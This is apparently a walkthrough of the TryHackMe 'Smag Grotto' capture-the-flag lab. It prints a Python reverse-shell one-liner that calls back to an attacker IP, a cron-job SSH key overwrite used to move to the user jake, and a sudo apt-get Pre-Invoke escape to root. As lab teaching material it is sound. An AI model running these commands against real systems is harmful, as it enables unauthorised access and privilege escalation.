# Smag Grotto CTF - TryHackMe Room
# **!! SPOILERS !!**
#### This repository documents my walkthrough for the **Smag Grotto** CTF challenge on [TryHackMe](https://tryhackme.com/room/smaggrotto). 
---

we see 2 open ports 22 and 80

![scn](imgs/scn.png "scn")

we found we hidden folders with feroxbuster

![ferox](imgs/ferox.png "ferox")

checking the `/mail` folder

![emails](imgs/cron.png "cron")

possible users: netadmin, uzi, jake, trodd

we also found .pcap file 

just by looking at the source of the page we see some credentials

![source](imgs/source.png "source")

wireshark analysis confirms them

![wire](imgs/wire.png "wire")

after looking at the frame we also know about `development.smag.thm` adding this to `/etc/hosts`

after checking development we see file listing, 

![idx](imgs/idx.png "idx")

we can login by using credentials we found earlier  

now we have access to command panel, commands like id, whoami, ls doesnt seem to give an output

![cmd](imgs/cmd.png "cmd")

i just used simple python3 reverse shell 

```
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.14.X.X",4445));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
```

we got access as www-data

![www](imgs/www.png "www")

after inspecting linpeas output 

![cron](imgs/cron.png "cron")

we can see cronjob that takes public key from `/opt/.backups/jake_id_rsa.pub.backup` and puts it into jake authorized keys, so if we can change the jake_id_rsa.pub.backup to our own key we could login as jake via ssh



we can generate our own ssh key with:

```
ssh-keygen -t rsa -b 4096 -C "your_email@example.com" -f /tmp/my_ssh_key
```

![rsa](imgs/rsa.png "rsa")

now we can use echo to change the `/opt/.backups/jake_id_rsa.pub.backup` to our own public key 

```
echo "our public key" > /opt/.backups/jake_id_rsa.pub.backup
```

now we can copy our private key and log as jake via ssh beacuse cron job will substitute jake's real key with our


we got user flag

![user](imgs/user.png "user")

now we see the sudo -l output:

![sudol](imgs/sudol.png "sudol")

checking the GTFObins

![gtfo](imgs/gtfo.png "gtfo")

we can use this command to gain root shell:

```
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```

we got root access and root flag

![root](imgs/root.png "root")

# MACHINE PWNED
